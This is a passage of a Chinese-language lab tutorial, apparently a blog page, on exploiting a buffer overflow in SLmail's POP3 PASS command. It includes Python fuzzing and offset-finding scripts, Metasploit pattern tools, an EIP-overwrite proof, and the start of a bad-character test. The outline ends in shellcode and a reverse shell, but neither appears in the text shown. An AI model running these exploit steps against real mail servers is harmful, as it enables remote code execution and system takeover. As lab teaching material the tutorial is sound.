+<li>确认<code>crash</code>所需的载荷，精确修改返回地址</li>
+<li>构建适用的<code>shellcode</code></li>
+<li>将<code>传输载荷</code>、<code>返回地址</code>和<code>shellcode</code>一并传入</li>
+<li>连接反向链接，获得控制权限，开启图形控制</li>
+</ol>
+<h2 id="触发溢出"><a href="#触发溢出" class="headerlink" title="触发溢出"></a>触发溢出</h2><h3 id="使用脚本进行交互"><a href="#使用脚本进行交互" class="headerlink" title="使用脚本进行交互"></a>使用脚本进行交互</h3><ul>
+<li><p>安装SLmail，传统windows安装程序，点击「下一步」直到结束即可<br><img src="register.png" alt="register"></p>
+<blockquote>
+<blockquote>
+<p>（重现实验的时候，由于试用已过期，找到了激活密钥）</p>
+</blockquote>
+</blockquote>
+</li>
+<li><p>重启电脑，slmail相关端口是否打开 (25/tcp, 110/tcp)<br><img src="ports.png" alt="ports"></p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ egrep  -w 25\|110 /etc/services</span><br><span class="line">smtp            25/tcp          mail</span><br><span class="line">pop3            110/tcp         pop-3           <span class="comment"># POP version 3</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在保证主机可目标主机可以通信的前提下，通过命令交互与主机取得通信</p>
+</li>
+<li><p>为了方便操作，我们选择通过脚本进行交互，而不是手工输入</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="comment"># 创建socket</span></span><br><span class="line">ip = <span class="string">'10.0.2.16'</span> <span class="comment"># 目标主机IP地址</span></span><br><span class="line">port = <span class="number">110</span>       <span class="comment"># 连接目标主机pop3端口</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    print(<span class="string">"\nsending buff..\r\n"</span>)         <span class="comment"># 打印开始 &gt;&gt;</span></span><br><span class="line">    s.connect((ip, port))                 <span class="comment"># 建立socket连接</span></span><br><span class="line">    print(s.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>))   <span class="comment"># 打印输出内容</span></span><br><span class="line">    s.send(<span class="string">b"USER Archive\r\n"</span>)           <span class="comment"># 用户名`Archive`登录</span></span><br><span class="line">    print(s.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    s.send(<span class="string">b"PASS test\r\n"</span>)              <span class="comment"># 输入用户`Archive`的密码`test`验证 (是否登录成功并不重要)</span></span><br><span class="line">    print(s.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    s.send(<span class="string">b"quit\r\n"</span>)                   <span class="comment"># 正常退出</span></span><br><span class="line">    print(s.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    s.close()                             <span class="comment"># 断开socket连接</span></span><br><span class="line">    print(<span class="string">'Done.'</span>)                        <span class="comment"># 打印退出 &gt;&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>localhost执行脚本输出内容<br><img src="hello.png" alt="hello"></p>
+</li>
+</ul>
+<h3 id="摸索缓冲区"><a href="#摸索缓冲区" class="headerlink" title="摸索缓冲区"></a>摸索缓冲区</h3><ul>
+<li><p>打开<code>Immunity Debugger</code>调试工具</p>
+<ul>
+<li><p>启动「File」-&gt; 「Attach」<br><img src="attach.png" alt="attach"></p>
+<blockquote>
+<blockquote>
+<p>关联程序，进行debug</p>
+</blockquote>
+</blockquote>
+</li>
+<li><p>选择<code>name</code>为「SLmail」的行，并点击「Attach」<br><img src="slmail.png" alt="attach"></p>
+<blockquote>
+<blockquote>
+<p>选择关联的程序，并确认</p>
+</blockquote>
+</blockquote>
+</li>
+<li><p>显示<code>「Paused」</code>的界面<br><img src="immunity.png" alt="immunity"></p>
+<blockquote>
+<blockquote>
+<p>程序右下角显示，当前程序的状态</p>
+</blockquote>
+</blockquote>
+</li>
+<li><p>按「F9」，状态显示为「Runing」<br><img src="running.png" alt="running"></p>
+<blockquote>
+<blockquote>
+<p>类似于点击<code>运行</code>，程序继续执行</p>
+</blockquote>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><p>尝试对<code>PASS</code>字段进行缓冲区测试，企图触发缓冲区溢出漏洞</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*-coding: utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">times = <span class="number">100</span></span><br><span class="line">ip = <span class="string">'10.0.2.16'</span></span><br><span class="line">port = <span class="number">110</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">    buffer = <span class="string">'A'</span> * times</span><br><span class="line">    times += <span class="number">100</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.settimeout(<span class="number">30</span>)            <span class="comment"># 30秒无法建立socket，将判断为超时</span></span><br><span class="line">        s.connect((ip, port))</span><br><span class="line">        s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">        s.send(<span class="string">b'USER test\r\n'</span>)</span><br><span class="line">        print(<span class="string">'\nFuzzing PASS with &#123;&#125; bytes'</span>.format(len(buffer)))</span><br><span class="line">        s.send(<span class="string">'PASS &#123;&#125;\r\n'</span>.format(buffer).encode())</span><br><span class="line">        s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">        s.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">'could note connect to server.'</span>)</span><br><span class="line">        print(e)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>当脚本程序发送到2700字符长度的时候，程序因为<code>recv（）</code>阻塞，长时间无响应</p>
+<ul>
+<li>程序运行受阻<br><img src="2700.png" alt="2700"><blockquote>
+<blockquote>
+<p>在localhost执行脚本</p>
+</blockquote>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><p>查看调试器<code>Immunity</code>发现其状态变换为「Paused」</p>
+<ul>
+<li>查看右上角「Debug registers」能够看到「EIP」和「EBP」现在存放的内容是<code>0x41414141</code></li>
+<li>字母<code>A</code>的ASCII编码便是<code>0x41</code>，<br><img src="paused.png" alt="paused"><blockquote>
+<blockquote>
+<p>在target主机查看<code>Immunity</code> 处于停止状态</p>
+</blockquote>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><p>EIP由于无法访问<code>0x414141</code>这个地址，因此造成程序被动停止「Paused」</p>
+<ul>
+<li>通过按「F9」继续执行，我们便会触发告警<br><img src="continue.png" alt="continue"><blockquote>
+<blockquote>
+<p>通过「F9」继续执行程序，弹出警告对话框：地址0x41414141无法读取</p>
+</blockquote>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<ul>
+<li>小结：在输入长度<code>2600</code>～<code>2700</code>字节之间，<code>Pass</code>的输入存在缓冲区溢出的可能。下一步将进行缓冲区大小的准确定位。</li>
+</ul>
+</blockquote>
+<h2 id="定位缓冲"><a href="#定位缓冲" class="headerlink" title="定位缓冲"></a>定位缓冲</h2><h3 id="判断缓冲区大小"><a href="#判断缓冲区大小" class="headerlink" title="判断缓冲区大小"></a>判断缓冲区大小</h3><p>在两个长度之间定位具体的点，我们常用的方法是<code>遍历法</code>O(N)和<code>二分法</code>O(N/2)。以上两种方法都是通过不断的碰撞，缩小搜索范围，以此靠近临界点。但是否有一个方法，可以更快地进行定位呢？以内存空间为尺度，每4个字节作为一个分割，构建彼此相邻都不相同的字符串，我们将得到一个一个<code>刻度尺</code>。通过输入<code>刻度尺</code>进行丈量，通过得到使用<code>特殊字符串</code>和<code>刻度尺</code>进行定位，我们就可以以算法复杂度O(1)定位缓冲大小。</p>
+<ul>
+<li><p>这个方法称为：唯一字符串法</p>
+<ul>
+<li>工具位置:<ul>
+<li>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb  # 生成唯一字符串</li>
+<li>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb  # 计算字符串偏移</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>由于程序已经<code>crash</code>，重启(关闭/开启)<code>Immunity</code></p>
+</li>
+<li><p>重新启动服务<code>service.msc</code>的「SeattleLab POP3 server」和「SeattleLab Smtp Server」</p>
+</li>
+<li><p><code>Immunity</code>重新挂载<code>SLmail</code>，按「F9」使调试处于<code>Running</code>状态</p>
+<blockquote>
+<blockquote>
+<p>由于这几个步骤多次使用，并且联动操作，往后提及将使用 <code>「调试slmail」</code>代替</p>
+</blockquote>
+</blockquote>
+</li>
+<li><p>生成唯一字符串</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700</span><br><span class="line">Aa0Aa1Aa2...l7Dl8Dl9</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>将字符串放进程序中</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*-coding: utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">ip = <span class="string">'10.0.2.16'</span></span><br><span class="line">port = <span class="number">110</span></span><br><span class="line">buffer =(<span class="string">'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9'</span></span><br><span class="line">         <span class="string">'Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9'</span></span><br><span class="line">         <span class="string">'Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9'</span></span><br><span class="line">         <span class="string">'Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9'</span></span><br><span class="line">         <span class="string">'Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9'</span></span><br><span class="line">         <span class="string">'Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9'</span></span><br><span class="line">         <span class="string">'Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9'</span></span><br><span class="line">         <span class="string">'Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9'</span></span><br><span class="line">         <span class="string">'Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9'</span></span><br><span class="line">         <span class="string">'As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9'</span></span><br><span class="line">         <span class="string">'Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9'</span></span><br><span class="line">         <span class="string">'Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9'</span></span><br><span class="line">         <span class="string">'Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9'</span></span><br><span class="line">         <span class="string">'Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9'</span></span><br><span class="line">         <span class="string">'Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9'</span></span><br><span class="line">         <span class="string">'Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9'</span></span><br><span class="line">         <span class="string">'Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9'</span></span><br><span class="line">         <span class="string">'Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9'</span></span><br><span class="line">         <span class="string">'Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9'</span></span><br><span class="line">         <span class="string">'Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9'</span></span><br><span class="line">         <span class="string">'Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9'</span></span><br><span class="line">         <span class="string">'Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9'</span></span><br><span class="line">         <span class="string">'Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9'</span></span><br><span class="line">         <span class="string">'Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9'</span></span><br><span class="line">         <span class="string">'Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9'</span></span><br><span class="line">         <span class="string">'By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9'</span></span><br><span class="line">         <span class="string">'Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9'</span></span><br><span class="line">         <span class="string">'Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9'</span></span><br><span class="line">         <span class="string">'Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9'</span></span><br><span class="line">         <span class="string">'Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9'</span></span><br><span class="line">         <span class="string">'Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9'</span></span><br><span class="line">         <span class="string">'Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9'</span></span><br><span class="line">         <span class="string">'Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9'</span></span><br><span class="line">         <span class="string">'Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9'</span></span><br><span class="line">         <span class="string">'Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9'</span></span><br><span class="line">         <span class="string">'Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9'</span></span><br><span class="line">         <span class="string">'Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9'</span></span><br><span class="line">         <span class="string">'Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9'</span></span><br><span class="line">         <span class="string">'Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9'</span></span><br><span class="line">         <span class="string">'Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9'</span></span><br><span class="line">         <span class="string">'Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9'</span></span><br><span class="line">         <span class="string">'De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9'</span></span><br><span class="line">         <span class="string">'Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9'</span></span><br><span class="line">         <span class="string">'Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9'</span></span><br><span class="line">         <span class="string">'Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    print(<span class="string">"Sending buffer..."</span>)</span><br><span class="line">    s.connect((ip, port))</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    s.send(<span class="string">b'USER test\r\n'</span>)</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    s.send(<span class="string">'PASS &#123;&#125;\r\n'</span>.format(buffer).encode())</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>执行脚本程序，查看<code>Immunity</code>调试信息<br><img src="EIP.png" alt="EIP"><br><img src="9iD8.png" alt="9iD8"></p>
+<blockquote>
+<blockquote>
+<p>可以看到EIP当前显示为<code>0x39694438</code>，对照ASICC表，信息为<code>9iD8</code><br>内存使用小端<code>little-endian</code>的存储方式，所以定位到的字符应为<code>8Di9</code></p>
+</blockquote>
+</blockquote>
+</li>
+<li><p>通过偏移查询<br><img src="locate.png" alt="locate"></p>
+<blockquote>
+<blockquote>
+<p>通过定位验证，<code>8Di9</code>和<code>0x39694438</code>偏移量都是<code>2606</code><br>即前面<code>2606</code>字节是触发溢出的前提，往后四个字节<code>8Di9</code>能触发<code>EIP</code>寄存器的变化</p>
+</blockquote>
+</blockquote>
+</li>
+</ul>
+<h3 id="验证EIP修改"><a href="#验证EIP修改" class="headerlink" title="验证EIP修改"></a>验证EIP修改</h3><p>溢出的触发只和大小有关，和内容无关，因此前<code>2606</code>个字符选择是任意的，这里选用<code>A</code>。为了和前面内容区分，对于即将修改的<code>EIP</code>我们使用<code>B</code>，同时把后面的内容覆盖为<code>C</code>。选择覆盖400个字节，是因为<code>shellcode</code>的大小往往在300个字节左右。</p>
+<ul>
+<li><p>「调试slmail」</p>
+</li>
+<li><p>验证<code>EIP</code>修改是否成功</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*-coding: utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">ip = <span class="string">'10.0.2.16'</span></span><br><span class="line">port = <span class="number">110</span></span><br><span class="line">buffer = <span class="string">'A'</span>*<span class="number">2606</span> + <span class="string">'BBBB'</span> + <span class="string">'C'</span>*<span class="number">400</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    print(<span class="string">"Sending buffer..."</span>)</span><br><span class="line">    s.connect((ip, port))</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    s.send(<span class="string">b'USER test\r\n'</span>)</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    s.send(<span class="string">'PASS &#123;&#125;\r\n'</span>.format(buffer).encode())</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>
+
+<p><img src="EIP_locate.png" alt="EIP-locate"></p>
+<blockquote>
+<blockquote>
+<p>通过<code>2606</code>个<code>A</code>，我们触发了缓冲区溢出，<code>BBBB</code>的显示，表示我们成功修改了<code>EIP</code><br>并且一个意外发现<code>ESP</code>被我们修改成了<code>CCC..CCC</code></p>
+</blockquote>
+</blockquote>
+</li>
+</ul>
+<blockquote>
+<ul>
+<li>小结：溢出的大小为<code>2606</code>字节，修改随后四位即可修改<code>EIP</code>，对程序进行控制。下一步：将在<code>ESP</code>的空间构建<code>shellcode</code>，利用<code>EIP</code>进行跳转。</li>
+</ul>
+</blockquote>
+<h2 id="进行渗透"><a href="#进行渗透" class="headerlink" title="进行渗透"></a>进行渗透</h2><h3 id="剔除坏字符-bad-characters"><a href="#剔除坏字符-bad-characters" class="headerlink" title="剔除坏字符(bad characters)"></a>剔除坏字符(bad characters)</h3><p>程序自身也存在<code>协议</code>，例如协定某个字符不能使用，某个字符出现，系统就需要中断。我们在构建<code>shellcode</code>之前，必须要把这些<code>控制/特殊</code>字符撇开，否则在植入<code>shellcode</code>的时候，脚本将出现莫名其妙的问题。这里说的字符是<code>0xff</code>(256)个二进制，坏字符的排查有点类似<code>沙中淘金</code>，即<code>坏字符</code>是字符中少数的。因此，我们可以生成所有的字符，填写到内存中，再一一甄别出来。</p>
+<ul>
+<li><p>坏字符的特征</p>
+<ul>
+<li>改变显示的字符</li>
+<li>使显示的顺序改变</li>
+<li>抹去/增加前面显示的字符</li>
+</ul>
+</li>
+<li><p>下面以一个字符为例进行切入，其他坏字符的剔除也是类似的</p>
+</li>
+<li><p>「调试slmail」</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*-coding: utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">ip = <span class="string">'10.0.2.16'</span></span><br><span class="line">port = <span class="number">110</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># badchars = &gt; \x0a, \x0d, \x00</span></span><br><span class="line">badchars = (<span class="string">b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"</span></span><br><span class="line">            <span class="string">b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"</span></span><br><span class="line">            <span class="string">b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"</span></span><br><span class="line">            <span class="string">b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"</span></span><br><span class="line">            <span class="string">b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"</span></span><br><span class="line">            <span class="string">b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"</span></span><br><span class="line">            <span class="string">b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"</span></span><br><span class="line">            <span class="string">b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"</span></span><br><span class="line">            <span class="string">b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"</span></span><br><span class="line">            <span 